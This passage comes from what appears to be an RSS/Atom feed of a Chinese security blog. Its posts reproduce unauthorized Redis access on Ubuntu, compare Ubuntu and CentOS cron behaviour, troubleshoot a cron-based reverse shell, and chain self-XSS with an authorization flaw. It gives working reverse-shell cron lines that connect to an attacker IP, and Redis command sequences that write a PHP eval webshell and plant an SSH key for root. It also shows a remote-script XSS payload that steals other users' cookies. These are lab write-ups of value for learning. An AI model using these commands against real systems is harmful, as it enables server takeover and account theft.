alt="mark"></p><p><strong>这里有一个需要注意的地方就是在设置变量的时候，也就是设置任务计划文件里的内容时，<code>\n</code>这个符号前后分别不能小于2个，否则文件内容里面的任务计划会出现乱码导致命令执行失败，这是其中一个坑,可以看到<code>/etc/cron.d</code>目录下分别成功创建了一个名为step1和step2的任务计划文件</strong></p><p><strong>文件内容分别为</strong><br><img src="http://pic.c1imber.top/blog/180819/aL0DJmLL5D.png?imageslim" alt="mark"></p><p><strong>但是shell还是反弹失败了，<code>/bin/sh</code>的指向也没有修改成功，通过查看日志可以看到这一次的错误原因是<code>ERROR (Syntax error, this crontab file will be ignored)</code></strong></p><p><img src="http://pic.c1imber.top/blog/180819/848Lkaj8EF.png?imageslim" alt="mark"><br><img src="http://pic.c1imber.top/blog/180819/4IdFkL5gci.png?imageslim" alt="mark"><br><img src="http://pic.c1imber.top/blog/180819/E2h2Fm7ffc.png?imageslim" alt="mark"></p><p><strong>这是由于redis向任务计划文件里写内容出现乱码而导致的语法错误，而乱码是避免不了的，centos会忽略乱码去执行格式正确的任务计划，而ubuntu并不会忽略这些乱码，所以导致命令执行失败，因为自己如果不使用redis写任务计划文件，而是正常向<code>/etc/cron.d</code>目录下写任务计划文件的话，命令是可以正常执行的，所以还是乱码的原因导致命令不能正常执行，而这个问题是不能解决的，因为利用redis未授权访问写的任务计划文件里都有乱码，这些代码来自redis的缓存数据</strong></p><h3 id="对于这一次失败的总结和看法"><a href="#对于这一次失败的总结和看法" class="headerlink" title="对于这一次失败的总结和看法"></a>对于这一次失败的总结和看法</h3><p><strong>对于ubuntu环境下的redis未授权访问漏洞写任务计划反弹shell的利用，自己遇到了很多坑，自己都一一排查解决了，结果最终还是在乱码这个问题上失败了，也可以看出确实ubuntu在某些方面设计的还是要比centos安全的，虽然这次漏洞利用失败了，但是自己也学到了不少，对centos和ubuntu这两个系统的cron的区别以及一些其它的安全机制有了更深的认识，所以，虽然失败，但是这一切都是值得的</strong></p><h1 id="补充"><a href="#补充" class="headerlink" title="补充"></a>补充</h1><p><strong>既然在ubuntu下写任务计划反弹shell这种方法不可行是因为ubuntu cron的原因，那么还是可以尝试其它的一些方式去利用该redis未授权访问漏洞的，比如利用redis写webshell或者向服务器写入ssh公钥去远程登陆，下面来说一下ubuntu环境下的redis未授权访问漏洞的另外两种利用手法</strong></p><h3 id="利用redis未授权访问写webshell"><a href="#利用redis未授权访问写webshell" class="headerlink" title="利用redis未授权访问写webshell"></a>利用redis未授权访问写webshell</h3><p><strong>通过redis未授权访问漏洞向ubuntu的web跟目录下写入一个webshell，然后要知道网站的根目录，在该测试环境下网站的根目录为<code>/var/www/html</code>,在kali的redis-cli的交互式shell下执行</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">set</span> aaa <span class="string">"\n\n\&lt;?php @eval(<span class="variable">$_POST</span>['c1imber']);?&gt;\n\n"</span></div><div class="line">config <span class="built_in">set</span> dir /var/www/html</div><div class="line">config <span class="built_in">set</span> dbfilename shell.php</div><div class="line">save</div></pre></td></tr></table></figure><p><img src="http://pic.c1imber.top/blog/180819/iJLjC1JD7B.png?imageslim" alt="mark"><br><strong>执行成功后可以看到在ubuntu的网站跟目录下成功写入了一个webshell,如果想让php解析，需要安装<code>libapache2-mod-php</code>这个扩展</strong></p><pre><code>sudo apt-get install libapache2-mod-php</code></pre><p><img src="http://pic.c1imber.top/blog/180819/fClIhiBE92.png?imageslim" alt="mark"><br><img src="http://pic.c1imber.top/blog/180819/IBEEbfgDJj.png?imageslim" alt="mark"></p><p><img src="http://pic.c1imber.top/blog/180820/eke56eebcF.png?imageslim" alt="mark"></p><h3 id="利用redis未授权访问向远程服务器写入ssh公钥"><a href="#利用redis未授权访问向远程服务器写入ssh公钥" class="headerlink" title="利用redis未授权访问向远程服务器写入ssh公钥"></a>利用redis未授权访问向远程服务器写入ssh公钥</h3><p><strong>ubuntu想要ssh远程登陆，首先需要安装openssh-server</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">apt-get install openssh-server</div></pre></td></tr></table></figure><p><img src="http://pic.c1imber.top/blog/180822/68m41gGBdj.png?imageslim" alt="mark"><br><strong>然后需要ubuntu开放22端口允许ssh远程登陆并且开启密钥登陆，这里要修改ubuntu的<code>openssh-server</code>的配置文件<code>/etc/ssh/sshd_config</code>里的几个地方</strong><br><img src="http://pic.c1imber.top/blog/180822/Di4g4GhlKE.png?imageslim" alt="mark"></p><p><strong>其中<code>RhostsRSAAuthentication yes</code>代表允许远程RSA认证登陆，也就是密钥登陆，<code>AuthorizedKeysFile %h/.ssh/authorized_keys</code>代表服务器公钥的存放位置，也是要利用redis未授权访问漏洞写入公钥文件的位置</strong></p><p><strong>修改完成后重启ssh服务</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">service ssh restart</div></pre></td></tr></table></figure><p><strong>之后在ubuntu的root目录下新建一个名为<code>.ssh</code>的目录</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">cd</span> /root</div><div class="line">mkdir .ssh</div></pre></td></tr></table></figure><p><img src="http://pic.c1imber.top/blog/180822/3fdg73Gl2F.png?imageslim" alt="mark"></p><p><strong>接下来使用kali在本地生成一对密钥</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">ssh-keygen -t rsa</div></pre></td></tr></table></figure><p><img src="http://pic.c1imber.top/blog/180819/D5KF0LHCbI.png?imageslim" alt="mark"><br><img src="http://pic.c1imber.top/blog/180819/hBIBd9J9kf.png?imageslim" alt="mark"><br><strong>之后将公钥<code>id_rsa.pub</code>写入到一个文件内</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">(<span class="built_in">echo</span> -e <span class="string">"\n\n"</span>;cat id_rsa.pub;<span class="built_in">echo</span> -e <span class="string">"\n\n"</span>)&gt;key.txt</div></pre></td></tr></table></figure><p><img src="http://pic.c1imber.top/blog/180819/HGJfgl2HGf.png?imageslim" alt="mark"><br><strong>之后利用redis未授权访问漏洞将公钥写到centos的<code>/root/.ssh/id_rsa</code>文件中，首先</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">cat /root/.ssh/key.txt | ./src/redis-cli -h 192.168.0.107 -x <span class="built_in">set</span> aaa</div></pre></td></tr></table></figure><p><strong>将刚刚生成的公钥设置给redis里的变量aaa</strong><br><img src="http://pic.c1imber.top/blog/180822/hC3l8d6iak.png?imageslim" alt="mark"><br><strong>接下来在kali的redis-cli的交互式shell下执行</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">config <span class="built_in">set</span> dir /root/.ssh</div><div class="line">config <span class="built_in">set</span> dbfilename authorized_keys</div><div class="line">save</div></pre></td></tr></table></figure><p><img src="http://pic.c1imber.top/blog/180822/g09I15ABF0.png?imageslim" alt="mark"></p><p><strong>执行完毕后会在ubuntu服务器的<code>/root/.ssh</code>目录下生成一个<code>authorized_keys</code>的公钥文件，利用这个公钥文件就可以远程连接这台ubuntu了</strong><br><img src="http://pic.c1imber.top/blog/180822/8gBjG01E3f.png?imageslim" alt="mark"></p><p><strong>ssh远程连接</strong><br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">ssh 192.168.0.107</div></pre></td></tr></table></figure></p><p><img src="http://pic.c1imber.top/blog/180822/LHC200k4jh.png?imageslim" alt="mark"></p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;记一次失败漏洞利用的经历–ubuntu下的redis未授权访问漏洞复现&quot;&gt;&lt;a href=&quot;#记一次失败漏洞利用的经历–ubuntu下的redis未授权访问漏洞复现&quot; class=&quot;headerlink&quot; title=&quot;记一次失败漏洞利用的经历–ubuntu下的redis未授权访问漏洞复现&quot;&gt;&lt;/a&gt;记一次失败漏洞利用的经历–ubuntu下的redis未授权访问漏洞复现&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;由于redis的配置不当导致攻击者可以利用该未授权访问漏洞去对服务器进行攻击，redis服务默认端口为6379端口，在利用该漏洞的时候，由于服务器是ubuntu的原因，遇到了不少坑导致最终并没有利用成功，不像之前在centos环境下利用该漏洞时那样顺利，所以在这里记录一下。在理解这篇文章之前，可以先参考一下之前的&lt;a href=&quot;http://lawlietweb.com/2018/08/17/2018-08-17/#more&quot;&gt;解决ubuntu任务计划写shell失败的问题&lt;/a&gt;和&lt;a href=&quot;http://lawlietweb.com/2018/08/18/2018-08-18/#more&quot;&gt;关于ubuntu和centos cron的一些区别&lt;/a&gt;这两篇文章&lt;/strong&gt;&lt;br&gt;
    
    </summary>
    
      <category term="漏洞复现" scheme="http://lawlietweb.com/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
    
      <category term="漏洞复现" scheme="http://lawlietweb.com/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
  </entry>
  
  <entry>
    <title>关于ubuntu和centos cron的一些区别</title>
    <link href="http://lawlietweb.com/2018/08/18/2018-08-18/"/>
    <id>http://lawlietweb.com/2018/08/18/2018-08-18/</id>
    <published>2018-08-18T14:01:54.000Z</published>
    <updated>2018-12-19T11:29:16.741Z</updated>
    
    <content type="html"><![CDATA[<h1 id="关于ubuntu和centos-cron的一些区别"><a href="#关于ubuntu和centos-cron的一些区别" class="headerlink" title="关于ubuntu和centos cron的一些区别"></a>关于ubuntu和centos cron的一些区别</h1><p><strong>写这篇文章的目的，源自<a href="http://lawlietweb.com/2018/08/17/2018-08-17/#more">解决ubuntu任务计划写shell失败的问题</a>这篇文章遗留下来的一个问题：就是在向ubuntu的<code>/var/spool/cron/crontabs</code>目录下创建任务计划文件时，需要修改该文件的权限为<code>600</code>,也就是<code>r------</code>，该任务计划文件才能执行，否则就会报错不能执行，报出<code>(root) INSECURE MODE (mode 0600 expected)</code>这个错误，这个问题当时没有太注意，以为是umask不同的问题。直到今天再次利用ubuntu环境下的redis未授权访问漏洞反弹shell时才发现这样一个问题，就是我们并不能直接利用未授权访问漏洞去修改<code>/var/spool/cron/crontabs</code>目录下我们创建的任务计划文件的权限，所以导致任务计划文件不能执行，于是又研究了一番，偶然发现ubuntu和centos的umask是相同的，都是<code>0022</code>，说明之前自己的想法是错误的，并不是umask不同的问题，而是centos和ubuntu cron的区别，下面就来总结一下其cron的区别</strong><br><a id="more"></a></p><p><strong>简单来说</strong></p><p><strong>ubuntu任务计划有一个目录是/var/spool/cron/crontabs，不过这个目录下的文件权限必须为600任务计划才能执行，这个是和centos的一个区别，但是如果利用redis漏洞的话，不可能直接去修改文件权限为600，而且如果写到/etc/crontab这个文件里的话，会覆盖掉之前的任务计划，所以如果服务器是ubuntu的话，可以写到/etc/cron.d这个任务计划目录下，这个目录下没有要求文件权限是600，并不会报错</strong></p><p><strong>下面来总结一下ubuntu和centos的cron</strong></p><p><strong>ubuntu的cron</strong></p><p><code>/etc/crontab</code><strong>：该文件中的任务计划写入就能直接执行</strong></p><p><code>/etc/cron.d</code><strong>：该目录下的文件为任务计划文件，只要文件内容格式符合cron的格式，就会执行</strong></p><p><code>/var/spool/cron/crontabs</code><strong>：该目录下的文件为任务计划文件，不过只有当任务计划文件的权限为<code>600</code>这个权限时任务计划才能执行，否则会报出<code>(root) INSECURE MODE (mode 0600 expected)</code>这个问题</strong></p><p><strong>centos的cron</strong></p><p><code>/etc/crontab</code><strong>：该文件中的任务计划写入就能直接执行</strong></p><p><code>/etc/cron.d</code><strong>：该目录下的文件为任务计划文件，只要文件内容格式符合cron的格式，就会执行</strong></p><p><strong>以上两点和ubuntu的cron没什么区别，唯一的区别是，centos的任务计划文件目录为<code>/var/spool/cron</code>这个目录，而且该目录下的任务计划文件并没有要求权限为<code>600</code>才能执行，这就是ubuntu和centos cron的一个区别，同时也是一个比较坑的地方，值得记录一下，以免以后忘记，至于为什么ubuntu和centos会有这样的区别，我认为和任务计划的目录有关系</strong></p><p><strong>centos的<code>/var/spool/cron</code>任务计划目录权限</strong><br><img src="http://pic.c1imber.top/blog/180819/bamjJLLBCm.png?imageslim" alt="mark"></p><p><strong>ubuntu的<code>/var/spool/cron/crontabs</code>任务计划目录</strong><br><img src="http://pic.c1imber.top/blog/180819/jD60555DCg.png?imageslim" alt="mark"></p><p><strong>可以看到两个任务计划目录的权限是不一样的，这也是ubuntu和centos cron不同的原因。以后再深入去研究</strong></p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;关于ubuntu和centos-cron的一些区别&quot;&gt;&lt;a href=&quot;#关于ubuntu和centos-cron的一些区别&quot; class=&quot;headerlink&quot; title=&quot;关于ubuntu和centos cron的一些区别&quot;&gt;&lt;/a&gt;关于ubuntu和centos cron的一些区别&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;写这篇文章的目的，源自&lt;a href=&quot;http://lawlietweb.com/2018/08/17/2018-08-17/#more&quot;&gt;解决ubuntu任务计划写shell失败的问题&lt;/a&gt;这篇文章遗留下来的一个问题：就是在向ubuntu的&lt;code&gt;/var/spool/cron/crontabs&lt;/code&gt;目录下创建任务计划文件时，需要修改该文件的权限为&lt;code&gt;600&lt;/code&gt;,也就是&lt;code&gt;r------&lt;/code&gt;，该任务计划文件才能执行，否则就会报错不能执行，报出&lt;code&gt;(root) INSECURE MODE (mode 0600 expected)&lt;/code&gt;这个错误，这个问题当时没有太注意，以为是umask不同的问题。直到今天再次利用ubuntu环境下的redis未授权访问漏洞反弹shell时才发现这样一个问题，就是我们并不能直接利用未授权访问漏洞去修改&lt;code&gt;/var/spool/cron/crontabs&lt;/code&gt;目录下我们创建的任务计划文件的权限，所以导致任务计划文件不能执行，于是又研究了一番，偶然发现ubuntu和centos的umask是相同的，都是&lt;code&gt;0022&lt;/code&gt;，说明之前自己的想法是错误的，并不是umask不同的问题，而是centos和ubuntu cron的区别，下面就来总结一下其cron的区别&lt;/strong&gt;&lt;br&gt;
    
    </summary>
    
      <category term="Linux渗透" scheme="http://lawlietweb.com/categories/Linux%E6%B8%97%E9%80%8F/"/>
    
    
      <category term="Linux" scheme="http://lawlietweb.com/tags/Linux/"/>
    
  </entry>
  
  <entry>
    <title>解决ubuntu任务计划写shell失败的问题</title>
    <link href="http://lawlietweb.com/2018/08/17/2018-08-17/"/>
    <id>http://lawlietweb.com/2018/08/17/2018-08-17/</id>
    <published>2018-08-17T15:01:14.000Z</published>
    <updated>2018-12-19T11:28:32.744Z</updated>
    
    <content type="html"><![CDATA[<h1 id="解决ubuntu任务计划写shell失败的问题"><a href="#解决ubuntu任务计划写shell失败的问题" class="headerlink" title="解决ubuntu任务计划写shell失败的问题"></a>解决ubuntu任务计划写shell失败的问题</h1><p><strong>这个问题的由来是因为自己在复现redis未授权访问漏洞时，通过向linux任务计划文件里写反弹shell的命令时，发现shell并不能反弹回来，之前使用的server端为Centos，一切顺利并没有出现这种问题，结果这次server换成了ubuntu，就出现不能反弹的问题，结果因为这个问题卡了很久，最终在kakaxi和ttgo2两位大佬的指导和帮助下才解决了该问题，将整个问题的解决过程在这里记录一下~</strong><br><a id="more"></a></p><h3 id="环境说明"><a href="#环境说明" class="headerlink" title="环境说明"></a>环境说明</h3><p><strong>ubuntu16.04桌面版：192.168.0.107，用来任务计划反弹shell的靶机</strong></p><p><strong>kali2.0：192.168.0.106，用来接收ubuntu反弹过来的shell</strong></p><h3 id="具体过程"><a href="#具体过程" class="headerlink" title="具体过程"></a>具体过程</h3><p><strong>事情源自于我利用redis未授权访问漏洞在向<code>ubuntu</code>的<code>/var/spool/cron/crontabs</code>目录下创建任务计划文件去反弹shell时，发现shell并不能反弹到自己的kali上</strong></p><p><strong>任务计划文件<code>/var/spool/cron/crontabs/root</code>内容如下</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">* * * * * /bin/bash -i &gt;&amp; /dev/tcp/192.168.0.106/7777 0&gt;&amp;1</div></pre></td></tr></table></figure><p><img src="http://pic.c1imber.top/blog/180817/C1IEiF0k24.png?imageslim" alt="mark"><br><strong>需要特别注意的一点是这的root文件的权限必须为600，也就是<code>rw-------</code>，否则会出现<code>cron[53948]: (root) INSECURE MODE (mode 0600 expected)</code>的错误，会影响到后面的实验</strong></p><p><strong>但是kali却迟迟接收不到反弹过来的shell</strong><br><img src="http://pic.c1imber.top/blog/180817/Li4blLb61B.png?imageslim" alt="mark"><br><strong>之前在centos上利用的时候并没有出现这种情况，使用ubuntu的时候居然不行，下面我们就来一步步的排查看看到底是什么原因导致的</strong></p><p><strong>首先，咱们先来看一下系统日志</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">tail -f /var/<span class="built_in">log</span>/syslog</div></pre></td></tr></table></figure><p><img src="http://pic.c1imber.top/blog/180817/211iak03He.png?imageslim" alt="mark"><br><strong>通过系统日志可以看到<code>CRON[55318]: (CRON) info (No MTA installed, discarding output)</code>这一条，我们之所以反弹shell失败，和这句话有着很大的关系，百度了一番后得到这句话的大概意思就是我们任务计划里的命令执行如果出现了错误，ubuntu会将这些错误信息去输出到ubuntu系统的邮件服务器，但是由于ubuntu系统默认没有安装邮件服务器，所以才导致了上面的错误</strong></p><p><strong>通过了上面的信息，可以推断出我们任务计划中的命令执行出现了某种错误，然后ubuntu处理这种错误方式是将错误信息发送到本地的邮件服务器，但是邮件服务器不存在，那么我们要想办法将错误信息重定向到文件里面去看看究竟是命令的什么地方产生了错误，修改任务计划文件为</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">* * * * * <span class="string">'/bin/bash -i &gt;&amp; /dev/tcp/192.168.0.106/7777 0&gt;&amp;1'</span>&gt;/tmp/error.txt 2&gt;&amp;1</div></pre></td></tr></table></figure><p><img src="http://pic.c1imber.top/blog/180818/7cHCBagDi3.png?imageslim" alt="mark"><br><strong>1代表标准输出。2代表标准错误输出，也就是命令执行出现的错误，这里将<code>/bin/bash -i &gt;&amp; /dev/tcp/192.168.0.106/7777 0&gt;&amp;1</code>执行的标准错误输出重定向到输出流，也就是<code>/tmp/error.txt</code>这个文件中，而不是邮件服务器，然后再看日志就没有刚刚的错误了</strong><br><img src="http://pic.c1imber.top/blog/180818/cHI0CEilb8.png?imageslim" alt="mark"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">/bin/sh: 1: /bin/bash -i &gt;&amp; /dev/tcp/192.168.0.106/7777 0&gt;&amp;1: not found</div></pre></td></tr></table></figure><p><strong>下面可以看到<code>tmp</code>目录下新生成了一个记录错误信息的文件error.txt,内容如下</strong><br><img src="http://pic.c1imber.top/blog/180818/224m4lc376.png?imageslim" alt="mark"><br><strong>这条错误的意思说<code>/bin/bash</code>没有被找到，通过错误信息还可以明白一件事情，那就是linux里面的cron中command执行的shell环境是<code>/bin/sh</code>，那我们可以再来看一下ubuntu下的<code>/bin/sh</code>文件究极是一个怎么样的文件</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">ls -al /bin/sh</div></pre></td></tr></table></figure><p><img src="http://pic.c1imber.top/blog/180818/mBK26LkHI7.png?imageslim" alt="mark"><br><strong>可以看到<code>/bin/sh</code>其实是一个软连接文件(l),类似于windows中的快捷方式，只不过在ubuntu中，<code>/bin/sh</code>这个软连接指向了<code>dash</code>，而我们反弹shell使用的shell环境是<code>bash</code>，所以这一点是反弹出错的根本原因</strong></p><p><strong>那么之前的centos为什么就能成功，下面来看一下centos里面的<code>/bin/sh</code>的指向</strong><br><img src="http://pic.c1imber.top/blog/180818/D6b21a44ml.png?imageslim" alt="mark"><br><strong>可以看到centos中<code>/bin/sh</code>的指向是bash，所以命令执行不会出错</strong></p><p><strong>在这里说一下bash和dash的区别，bash是具有交互能力的shell，而dash不具有交互能力，只是具有运行脚本的能力的shell</strong></p><p><strong>搞清楚了根本的原因后，来说一下解决的办法，这里有两种解决办法，其中一种解决办法是通过修改ubuntu中<code>/bin/sh</code>的指向，将dash改为bash即可，命令如下</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">ln -s -f bash /bin/sh</div></pre></td></tr></table></figure><p><img src="http://pic.c1imber.top/blog/180818/cGhdh4gbmF.png?imageslim" alt="mark"><br><strong>可以看到此时<code>/bin/sh</code>以及指向了<code>bash</code>，此时将任务计划里的文件修改为之前反弹shell的命令，可以看到不会再报错了，并且shell成功反弹到了kali上</strong><br><img src="http://pic.c1imber.top/blog/180818/Jhm2mgDdhi.png?imageslim" alt="mark"><br><img src="http://pic.c1imber.top/blog/180818/cChIDHhm8m.png?imageslim" alt="mark"></p><p><strong>下面来说一下第二种解决办法，首先我们先将<code>/bin/sh</code>的指向改回<code>dash</code></strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">ln -s -f dash /bin/sh</div></pre></td></tr></table></figure><p><img src="http://pic.c1imber.top/blog/180818/6kcc9EHIEj.png?imageslim" alt="mark"><br><img src="http://pic.c1imber.top/blog/180818/Kcal0c0Be3.png?imageslim" alt="mark"><br><strong>下面来说一下第二种方法，就是避免在cron文件里去使用bash这个具有交互能力的shell，我们可以另外的去建一个反弹shell的shell脚本文件，然后在任务计划里面去直接调用运行这个shell脚本文件即可</strong></p><p><strong>shell脚本文件如下，文件名为<code>/tmp/test.sh</code></strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#!/bin/bash</span></div><div class="line">/bin/bash -i &gt;&amp; /dev/tcp/192.168.0.107/7777 0&gt;&amp;1</div></pre></td></tr></table></figure><p><img src="http://pic.c1imber.top/blog/180818/HHkFmi68jB.png?imageslim" alt="mark"><br><strong>然后为test.sh加上执行权限</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">chmod +x /tmp/test.sh</div></pre></td></tr></table></figure><p><img src="http://pic.c1imber.top/blog/180818/hDGaFg6CFG.png?imageslim" alt="mark"><br><strong>之后任务计划里的内容修改为</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">* * * * * /tmp/test.sh</div></pre></td></tr></table></figure><p><img src="http://pic.c1imber.top/blog/180818/fB8kK61H0B.png?imageslim" alt="mark"><br><strong>由于现在cron的shell环境为dash，所以具有可以直接运行<code>/tmp/test.sh</code>这个脚本文件的能力，所以执行了test.sh里面这条反弹shell的命令，现在便可以看到kali上成功反弹到了shell</strong><br><img src="http://pic.c1imber.top/blog/180818/cfi3KGBI0d.png?imageslim" alt="mark"></p><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p><strong>这一次真的是踩了很多坑，最终才终于弄明白，通过这次的学习使我对linux的认识更加的深刻了，同时也学到了解决问题的思路和方法，在这里十分感谢kakaxi和ttgo2两位大神的帮助！</strong></p><h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><p><strong><a href="https://www.365yg.com/i6590668394092036612#mid=1568076190183425" target="_blank" rel="external">视频详解（来自kakaxi和ttgo2两位师傅）</a></strong></p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;解决ubuntu任务计划写shell失败的问题&quot;&gt;&lt;a href=&quot;#解决ubuntu任务计划写shell失败的问题&quot; class=&quot;headerlink&quot; title=&quot;解决ubuntu任务计划写shell失败的问题&quot;&gt;&lt;/a&gt;解决ubuntu任务计划写shell失败的问题&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;这个问题的由来是因为自己在复现redis未授权访问漏洞时，通过向linux任务计划文件里写反弹shell的命令时，发现shell并不能反弹回来，之前使用的server端为Centos，一切顺利并没有出现这种问题，结果这次server换成了ubuntu，就出现不能反弹的问题，结果因为这个问题卡了很久，最终在kakaxi和ttgo2两位大佬的指导和帮助下才解决了该问题，将整个问题的解决过程在这里记录一下~&lt;/strong&gt;&lt;br&gt;
    
    </summary>
    
      <category term="Linux渗透" scheme="http://lawlietweb.com/categories/Linux%E6%B8%97%E9%80%8F/"/>
    
    
      <category term="Linux" scheme="http://lawlietweb.com/tags/Linux/"/>
    
  </entry>
  
  <entry>
    <title>漏洞挖掘中的脑洞大开---使用漏洞组合拳扩大漏洞危害</title>
    <link href="http://lawlietweb.com/2018/08/08/%E6%BC%8F%E6%B4%9E%E7%BB%84%E5%90%88/"/>
    <id>http://lawlietweb.com/2018/08/08/漏洞组合/</id>
    <published>2018-08-07T16:26:51.000Z</published>
    <updated>2018-12-19T11:27:34.930Z</updated>
    
    <content type="html"><![CDATA[<h1 id="漏洞挖掘中的脑洞大开—使用漏洞组合拳扩大漏洞危害"><a href="#漏洞挖掘中的脑洞大开—使用漏洞组合拳扩大漏洞危害" class="headerlink" title="漏洞挖掘中的脑洞大开—使用漏洞组合拳扩大漏洞危害"></a>漏洞挖掘中的脑洞大开—使用漏洞组合拳扩大漏洞危害</h1><p><strong>这篇文章给大家分享一下我在漏洞挖掘中对一些漏洞组合拳的利用方法，相信大家在漏洞挖掘中都遇到过这样一个问题，比如我发现了一个存储型xss，但是只是鸡肋的selfxss，只能自己看到才能触发、又或者是单单的csrf、或者没有实质危害的越权漏洞等，就算提交了也只能算低危，如果小伙伴们在漏洞挖掘中遇到了这些问题，那么这篇文章或许可以帮到各位一些，下面我通过我挖掘到的两个利用漏洞组合拳的方式，分享一下如何将低危漏洞变的有价值</strong><br><a id="more"></a></p><h3 id="组合拳一式：selfxss-水平越权漏洞"><a href="#组合拳一式：selfxss-水平越权漏洞" class="headerlink" title="组合拳一式：selfxss+水平越权漏洞"></a>组合拳一式：selfxss+水平越权漏洞</h3><p><strong>虽然只是一个selfxss，但是结合水平越权添加的话，可以向其他用户个人中心添加xss payload，从而使该目标网站的目标用户去触发该xss漏洞，将js恶意代码在其浏览器执行</strong></p><p><strong>举个栗子：</strong><br><strong>用户中心设置信息的地方没有对xss过滤导致存在存储型xss漏洞，尝试新增常用联系人，在详细地址的位置插入xss的payload</strong><br><img src="http://pic.c1imber.top/blog/180808/2h2EHIHFCF.png?imageslim" alt="mark"></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;script&gt;alert(<span class="built_in">document</span>.cookie)&lt;<span class="regexp">/script&gt;</span></div></pre></td></tr></table></figure><p><img src="http://pic.c1imber.top/blog/180808/8mLLkI6508.png?imageslim" alt="mark"><br><strong>但是此处有可能只是一个selfxss，如果只是能打到自己的cookie，那么这个存储型xss就会显得很鸡肋。但是这个网站存在一个越权添加个人信息的漏洞，越权的漏洞之前也提交过一次，在添加的时候通过修改user_id可以越权将信息添加到其它用户里，在这里可以利用越权漏洞将xsspayload插入其他用户的个人中心里去扩大这个selfxss的危害,简单来说就是利用越权添加和selfxss的组合拳增加这个selfxss的危害，这样就可以打到其他用户的cookie</strong></p><p><strong>还是之前测试越权的两个账号</strong></p><pre><code>用户名：格鲁特   用户id：112054用户名：火箭    用户id：112069</code></pre><p><strong>首先在格鲁特的个人中心中添加常用联系人，之前说了在详细地址处存在存储型xss，这里插入加载远程js的xsspayload，同时使用xss平台接收信息</strong></p><p><strong>xsspayload：</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;script src=xss平台上的远程脚本&gt;&lt;/script&gt;</div></pre></td></tr></table></figure><p><strong>之后抓包，数据包里有个参数为user_id，这个参数可控，导致可以越权</strong><br><img src="http://pic.c1imber.top/blog/180808/8DCH9k5D1l.png?imageslim" alt="mark"><br><strong>修改数据包中的user_id,尝试将此条包含xsspayload的信息越权添加到其他用户的个人信息中，如果成功，那么其他用户在登陆后查看时就会触发xss代码加载远程脚本，将用户的cookie打到我们的xss平台上，这里将user_id改为火箭用户的id（112069）</strong><br><img src="http://pic.c1imber.top/blog/180808/7A8I50Gb0d.png?imageslim" alt="mark"><br><strong>可以看到添加成功，但是在当前的账号上看不到刚刚添加的信息</strong></p><p><strong>然后使用火箭账号登陆，可以看到包含xsspayload的信息是否已经被越权添加到火箭用户的常用信息中,可以看到火箭用户在登陆后查看联系人信息时我们的xss平台就能接收到火箭用户的cookie</strong><br><img src="http://pic.c1imber.top/blog/180808/6D023iAEL1.png?imageslim" alt="mark"><br><img src="http://pic.c1imber.top/blog/180808/EcL0eeimml.png?imageslim" alt="mark"><br><strong>接下来将获取到的火箭用户的cookie替换为格鲁特用户的cookie，可以看到成功登陆到了火箭的账号</strong><br><img src="http://pic.c1imber.top/blog/180808/EB6Lga9LI4.png?imageslim" alt="mark"><br><strong>而且user_id只有6位数，是可以遍历的，如果遍历了所有的uid，那么就可以打到所有用户的cookie，所以漏洞的危害还是非常大的，所以通过selfxss+水平越权两个低危漏洞组合就可以变成一个影响严重的高危漏洞</strong></p><h3 id="组合拳二式：selfxss-csrf"><a href="#组合拳二式：selfxss-csrf" class="headerlink" 